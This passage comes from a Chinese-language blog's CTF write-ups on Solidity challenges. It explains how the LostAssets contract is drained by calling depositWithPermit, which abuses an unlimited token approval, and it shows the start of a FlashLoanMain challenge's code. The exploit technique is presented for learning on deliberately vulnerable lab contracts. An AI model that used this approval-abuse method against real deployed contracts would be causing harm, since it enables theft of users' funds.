&#123;</span><br><span class="line">        underlying = _underlying;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() external returns (uint256) &#123;</span><br><span class="line">        uint256 _amount = IERC20(underlying).balanceOf(msg.sender);</span><br><span class="line">        IERC20(underlying).safeTransferFrom(msg.sender, address(this), _amount);</span><br><span class="line">        return _deposit(_amount, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit(uint256 amount) external returns (uint256) &#123;</span><br><span class="line">        IERC20(underlying).safeTransferFrom(msg.sender, address(this), amount);</span><br><span class="line">        return _deposit(amount, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function depositWithPermit(</span><br><span class="line">        address target,</span><br><span class="line">        uint256 value,</span><br><span class="line">        uint256 deadline,</span><br><span class="line">        uint8 v,</span><br><span class="line">        bytes32 r,</span><br><span class="line">        bytes32 s,</span><br><span class="line">        address to</span><br><span class="line">    ) external returns (uint256) &#123;</span><br><span class="line">        // permit is an alternative to the standard approve call:</span><br><span class="line">        // it allows an off-chain secure signature to be used to register an allowance.</span><br><span class="line">        // The permitter is approving the beneficiary to spend their money, by signing the permit request</span><br><span class="line">        IERC20Permit(underlying).permit(</span><br><span class="line">            target,</span><br><span class="line">            address(this),</span><br><span class="line">            value,</span><br><span class="line">            deadline,</span><br><span class="line">            v,</span><br><span class="line">            r,</span><br><span class="line">            s</span><br><span class="line">        );</span><br><span class="line">        IERC20(underlying).safeTransferFrom(target, address(this), value);</span><br><span class="line">        return _deposit(value, to);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _deposit(uint256 value, address to) internal returns (uint256) &#123;</span><br><span class="line">        _mint(to, value);</span><br><span class="line">        return value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @notice withdraw all</span><br><span class="line">    function withdraw() external returns (uint256) &#123;</span><br><span class="line">        return _withdraw(msg.sender, balanceOf(msg.sender), msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @notice withdraw specified `amount`</span><br><span class="line">    function withdraw(uint256 amount) external returns (uint256) &#123;</span><br><span class="line">        return _withdraw(msg.sender, amount, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _withdraw(</span><br><span class="line">        address from,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        address to</span><br><span class="line">    ) internal returns (uint256) &#123;</span><br><span class="line">        _burn(from, amount);</span><br><span class="line">        IERC20(underlying).safeTransfer(to, amount);</span><br><span class="line">        return amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract LostAssets &#123;</span><br><span class="line">    MockWETH public WETH;</span><br><span class="line">    MocksWETH public sWETH;</span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        require(msg.value &gt;= 1 ether, &quot;At least 1 ether&quot;);//</span><br><span class="line">        WETH = new MockWETH();</span><br><span class="line">        sWETH = new MocksWETH(address(WETH));</span><br><span class="line">        WETH.deposit&#123;value: msg.value&#125;();//假设我们就发送1ETH，LostAssets合约 在 ETH合约 拥有1ETH </span><br><span class="line">        // Guaranteed interchangeability of WETH and sWETH</span><br><span class="line">        WETH.approve(address(sWETH), type(uint256).max);//approve金额给sWETH</span><br><span class="line">        // sWETH.approve(address(WETH), type(uint256).max); // WETH cannot use approval</span><br><span class="line">        // Deposit half of weth balance</span><br><span class="line">        sWETH.deposit(msg.value / 2);// sWETH deposit 了 0.5ETH，还剩 0.5ETH 授权可用</span><br><span class="line"></span><br><span class="line">        //因此我们需要获得sWETH的授权，获得0.5ETH授权。</span><br><span class="line">        //授权情况：LostAssets =&gt; sWETH =&gt; 我的钱包地址。</span><br><span class="line">        //因为sWETH有一个方法depositWithPermit，我们是否可以用这个方法在链下进行授权，</span><br><span class="line">        //然后实现：我的钱包代理 LostAssets剩余的0.5ETH，然后划走0.5ETH给其他用户？</span><br><span class="line">        //因此我们先要进行签名授权，但是如何将 LostAssets合约 签名给我的地址呢？从而拿到v,r,s</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        require(WETH.balanceOf(address(this)) == 0);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目包括三个合约：MockWETH.sol，MocksWETH.sol，LostAssets.sol。</p><p>项目的意思是：</p><ul><li>MockWETH和MocksWETH的ERC20代币之间具有流动性</li><li><p>用户可以在MockWETH进行存款与提款，也可以将用户在MockWETH的权益转移到MocksWETH。</p></li><li><p>但是在MocksWETH无法提款，它的提款操作是将权益转回到MockWETH。用户在MockWETH才能真正的提款发送以太</p></li></ul><p>我们的任务：成功调用ClostAssets.sol的isComplete()并且返回true</p><h3 id="1-分析题目的目标"><a href="#1-分析题目的目标" class="headerlink" title="1.分析题目的目标"></a>1.分析题目的目标</h3><p>isComplete()要求<code>WETH.balanceOf(address(this)) == 0</code>，也就是将LostAssets合约在MockWETH的余额设置为0</p><p>我们设置msg.value=1ETH，在LostAssets合约的构造器中做了以下操作</p><ol><li><code>require(msg.value &gt;= 1 ether, &quot;At least 1 ether&quot;);</code>：msg.value至少为1ETH</li><li><code>WETH = new MockWETH();</code>和<code>sWETH = new MocksWETH(address(WETH));</code>：新建了MockWETH和MocksWETH</li><li><code>WETH.deposit&#123;value: msg.value&#125;();</code>：msg.sender是LostAssets，所以LostAssets在MockWETH中有1ETH</li><li><code>WETH.approve(address(sWETH), type(uint256).max);</code>：<strong>LostAssets授权给sWETH最大值金额，这就意味着，sWETH可以对LostAssets在MoskWETH的金额做任何操作，那么后面只要我们调用TransferFrom可以操作余额</strong></li><li><code>sWETH.deposit(msg.value / 2);</code>：msg.sender是LostAssets，LostAssets将其在WETH的1ETH划走0.5ETH到sWETH，这就体现了流动性</li></ol><p>我们的目的是将LostAssets在WETH剩余的0.5ETH也划走，也就是设置为0</p><h3 id="2-分析合约"><a href="#2-分析合约" class="headerlink" title="2.分析合约"></a>2.分析合约</h3><p><strong>MockWETH合约</strong></p><p>这个合约继承了@openzeppelin的ERC20，写了一个存款函数<code>deposit()</code>和一个提款函数<code>withdraw(uint256 wad)</code>，并且发现提款函数并没有重入攻击的可能性，并且版本是0.8.10，也没有溢出漏洞的可能性</p><p><strong>MocksWETH合约</strong></p><p>此合约将MockWETH传入，并且通过<code>using SafeERC20 for IERC20;</code>，在每一个存款和提款方法使用underlying地址对MockWETH合约进行操作：验证是否在MockWETH合约真的有这么多钱，才给存款；将在MocksWETH合约的余额重新划入MockWETH，然后进一步在MockWETH合约进行提款获取以太</p><h3 id="3-分析解题"><a href="#3-分析解题" class="headerlink" title="3.分析解题"></a>3.分析解题</h3><h4 id="3-1错误想法"><a href="#3-1错误想法" class="headerlink" title="3.1错误想法"></a>3.1错误想法</h4><p>因为LostAssets approve给MocksWETH了很大的金额，因此MocksWETH可以划走剩余的0.5ETH，但是合约不会主动去调用，我们无法直接通过让MocksWETH主动来转走0.5ETH</p><p>但是MocksWETH当中有一个<code>depositWithPermit()</code>函数，意思是可以进行链下签名授权，然后再链上再进行操作，这个是<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-2612.md">eip-2612</a>和<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-712.md">eip-712</a>相关的内容。eip-2612和eip-712的permit是允许一个EOA账户进行链下签名然后链上操作，但题意是想将LostAssets的0.5ETH进行代理，无论是LostAssets还是被授权给的MocksWETH都是一个合约，不是EOA账户，因此无法进行permit签名！【合约虽然也有私钥，理论上可以进行签名，但是eip协议后来又规定合约签名出来的交易无效，并且想要获取一个合约的私钥是不可能的，只能暴力破解】</p><p>又因为题目给的合约并没有实现<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1271.md">eip-1271</a>，因此无法使用合约链下签名</p><p>题目的考点应该是permit()，但是我认为无法通过permit()进行链下操作而解题的。题目我又找不到相关的方法可以进行操作，因为继承了@openzeppelin的ERC20、ERC20Permit，基本上是没什么问题的，只有这么一个permit()可以进行操作，然而这个可能性也没了</p><p>我觉得可能是出错题了，我觉得题目可以有如下两种改法：</p><ol><li>题目从” 将合约拥有的钱设置为0 “改成“ 将EOA拥有的钱设置为0 “，那么才有可能用到permit函数”</li><li>题目不是实现ERC20Permit，而是实现<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1271.md">eip-1271</a>，那么就可以利用合约进行链下签名了，即LostAssets可以进行签名授权0.5ETH</li></ol><p><a href="https://ethereum.stackexchange.com/questions/142795/could-a-contract-permits-erc20-token-to-an-eoa-account/142811#142814">这是我在stackoverflow的提问</a></p><h4 id="3-2正确想法"><a href="#3-2正确想法" class="headerlink" title="3.2正确想法"></a>3.2正确想法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function depositWithPermit(</span><br><span class="line">        address target,</span><br><span class="line">        uint256 value,</span><br><span class="line">        uint256 deadline,</span><br><span class="line">        uint8 v,</span><br><span class="line">        bytes32 r,</span><br><span class="line">        bytes32 s,</span><br><span class="line">        address to</span><br><span class="line">    ) external returns (uint256) &#123;</span><br><span class="line">        // permit is an alternative to the standard approve call:</span><br><span class="line">        // it allows an off-chain secure signature to be used to register an allowance.</span><br><span class="line">        // The permitter is approving the beneficiary to spend their money, by signing the permit request</span><br><span class="line">        IERC20Permit(underlying).permit(</span><br><span class="line">            target,</span><br><span class="line">            address(this),</span><br><span class="line">            value,</span><br><span class="line">            deadline,</span><br><span class="line">            v,</span><br><span class="line">            r,</span><br><span class="line">            s</span><br><span class="line">        );</span><br><span class="line">        IERC20(underlying).safeTransferFrom(target, address(this), value);</span><br><span class="line">        return _deposit(value, to);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>解题关键还是depositWithPermit()。我们发现，<code>IERC20Permit(underlying).permit</code>方法，underlying是<code>contract MockWETH is ERC20(&quot;Wrapped ETH&quot;, &quot;WETH&quot;)</code>，它并没有permit方法，因此会进入fallback，执行deposit函数，但是对我们转移代币没什么作用，只会<code>_mint</code>记录一下财产情况</p><p><code>IERC20(underlying).safeTransferFrom(target, address(this), value)</code>是关键：因为<code>using SafeERC20 for IERC20;</code>且import了相关合约，这个方法会进入方法体执行执行。先前<code>WETH.approve(address(sWETH), type(uint256).max);</code>LostAssets已经授权最大值给sWETH了，因此这里sWETH可以进行safeTransferFrom来代理LostAssets的财产。于是我们可以将剩余的一半余额进行转移到其他任意地址，这样余额就为0满足题目要求了</p><p>注意：我调用MocksWETH，depositWithPermit方法中又<code>IERC20(underlying).safeTransferFrom(target, address(this), value)</code>进行调用，在safeTransferFrom中，msg.sender不是我，而是MocksWETH</p><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>1.部署题目</p><p><img src="/2023/06/23/00.security/38.LostAssets/image-20230127233543493.png" alt="image-20230127233543493"></p><p>2.调用depositWithPermit</p><p><img src="/2023/06/23/00.security/38.LostAssets/image-20230127233743733.png" alt="image-20230127233743733"></p><p>3.成功修改</p><p><img src="/2023/06/23/00.security/38.LostAssets/image-20230127233814246.png" alt="image-20230127233814246"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本题涉及ERC20，ERC20Permit，相关的内容是<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1271.md">eip-1271</a>，<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-712.md">eip-712</a>，<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-2612.md">eip-2612</a>，ecrecover还原signature，ERC20之间的互操作性。实际上是逻辑上的错误，感觉题目并没有太大的意义，先是授权了最大值，然后depositWithPermit当中又转账</p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>37.FlashLoanMain</title>
      <link href="/2023/06/23/00.security/37.FlashLoanMain/"/>
      <url>/2023/06/23/00.security/37.FlashLoanMain/</url>
      
        <content type="html"><![CDATA[<h1 id="FlashLoanMain"><a href="#FlashLoanMain" class="headerlink" title="FlashLoanMain"></a>FlashLoanMain</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>要求：FlashLoanMain的isComplete设置为true</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface ICert &#123;</span><br><span class="line">    function totalSupply() external view returns (uint256);</span><br><span class="line">    function balanceOf(address account) external view returns (uint256);</span><br><span class="line">    function transfer(address to, uint256 amount) external returns (bool);</span><br><span class="line">    function allowance(address owner, address spender) external view returns (uint256);</span><br><span class="line">    function approve(address spender, uint256 amount) external returns (bool);</span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) external returns (bool);</span><br><span class="line">&#125;//IERC20</span><br><span class="line"></span><br><span class="line">interface IVault &#123;</span><br><span class="line">    function join(uint256 amount) external;</span><br><span class="line">    function exit() external;</span><br><span class="line">    function cert() external view returns(ICert);</span><br><span class="line">    function transferToAccount(address account, uint256 amount) external returns(bool);</span><br><span class="line">    function setPriveder(address flashLoanPriveder_) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IFlashBorrower &#123;</span><br><span class="line">    function onFlashLoan(</span><br><span class="line">        address initiator,</span><br><span class="line">        address token,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IFlashLoanMain &#123;</span><br><span class="line">    function airdrop()external;</span><br><span class="line">    function Complete()external returns(bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IFlashLoanPriveder &#123;</span><br><span class="line">    function flashLoan(</span><br><span class="line">        IFlashBorrower receiver,</span><br><span class="line">        address token,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes memory signature,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">library StringsUpgradeable &#123;</span><br><span class="line">    bytes16 private constant _HEX_SYMBOLS = &quot;0123456789abcdef&quot;;</span><br><span class="line"></span><br><span class="line">    function toString(uint256 value) internal pure returns (string memory) &#123;</span><br><span class="line"></span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 digits;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            digits++;</span><br><span class="line">            temp /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        bytes memory buffer = new bytes(digits);</span><br><span class="line">        while (value != 0) &#123;</span><br><span class="line">            digits -= 1;</span><br><span class="line">            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));</span><br><span class="line">            value /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function toHexString(uint256 value) internal pure returns (string memory) &#123;</span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0x00&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 length = 0;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            length++;</span><br><span class="line">            temp &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return toHexString(value, length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) &#123;</span><br><span class="line">        bytes memory buffer = new bytes(2 * length + 2);</span><br><span class="line">        buffer[0] = &quot;0&quot;;</span><br><span class="line">        buffer[1] = &quot;x&quot;;</span><br><span class="line">        for (uint256 i = 2 * length + 1; i &gt; 1; --i) &#123;</span><br><span class="line">            buffer[i] = _HEX_SYMBOLS[value &amp; 0xf];</span><br><span class="line">            value &gt;&gt;= 4;</span><br><span class="line">        &#125;</span><br><span class="line">        require(value == 0, &quot;Strings: hex length insufficient&quot;);</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">library ECDSAUpgradeable &#123;</span><br><span class="line">    enum RecoverError &#123;</span><br><span class="line">        NoError,</span><br><span class="line">        InvalidSignature,</span><br><span class="line">        InvalidSignatureLength,</span><br><span class="line">        InvalidSignatureS,</span><br><span class="line">        InvalidSignatureV</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _throwError(RecoverError error) private pure &#123;</span><br><span class="line">        if (error == RecoverError.NoError) &#123;</span><br><span class="line">            return; // no error: do nothing</span><br><span class="line">        &#125; else if (error == RecoverError.InvalidSignature) &#123;</span><br><span class="line">            revert(&quot;ECDSA: invalid signature&quot;);</span><br><span class="line">        &#125; else if (error == RecoverError.InvalidSignatureLength) &#123;</span><br><span class="line">            revert(&quot;ECDSA: invalid signature length&quot;);</span><br><span class="line">        &#125; else if (error == RecoverError.InvalidSignatureS) &#123;</span><br><span class="line">            revert(&quot;ECDSA: invalid signature &#x27;s&#x27; value&quot;);</span><br><span class="line">        &#125; else if (error == RecoverError.InvalidSignatureV) &#123;</span><br><span class="line">            revert(&quot;ECDSA: invalid signature &#x27;v&#x27; value&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function tryRecover(</span><br><span class="line">        bytes32 hash,</span><br><span class="line">        bytes32 r,</span><br><span class="line">        bytes32 vs</span><br><span class="line">    ) internal pure returns (address, RecoverError) &#123;</span><br><span class="line">        bytes32 s = vs &amp; bytes32(0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);</span><br><span class="line">        uint8 v = uint8((uint256(vs) &gt;&gt; 255) + 27);</span><br><span class="line">        return tryRecover(hash, v, r, s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function recover(</span><br><span class="line">        bytes32 hash,</span><br><span class="line">        bytes32 r,</span><br><span class="line">        bytes32 vs</span><br><span class="line">    ) internal pure returns (address) &#123;</span><br><span class="line">        (address recovered, RecoverError error) = tryRecover(hash, r, vs);</span><br><span class="line">        _throwError(error);</span><br><span class="line">        return recovered;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tryRecover(bytes32 hash, bytes memory signature) internal pure returns (address, RecoverError) &#123;</span><br><span class="line">        if (signature.length == 65) &#123;</span><br><span class="line">            bytes32 r;</span><br><span class="line">            bytes32 s;</span><br><span class="line">            uint8 v;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                r := mload(add(signature, 0x20))</span><br><span class="line">                s := mload(add(signature, 0x40))</span><br><span class="line">                v := byte(0, mload(add(signature, 0x60)))</span><br><span class="line">            &#125;</span><br><span class="line">            return tryRecover(hash, v, r, s);</span><br><span class="line">        &#125; else if (signature.length == 64) &#123;</span><br><span class="line">            bytes32 r;</span><br><span class="line">            bytes32 vs;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                r := mload(add(signature, 0x20))</span><br><span class="line">                vs := mload(add(signature, 0x40))</span><br><span class="line">            &#125;</span><br><span class="line">            return tryRecover(hash, r, vs);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return (address(0), RecoverError.InvalidSignatureLength);</span><br><span class="line">        &#125;</span><br><span class="line">    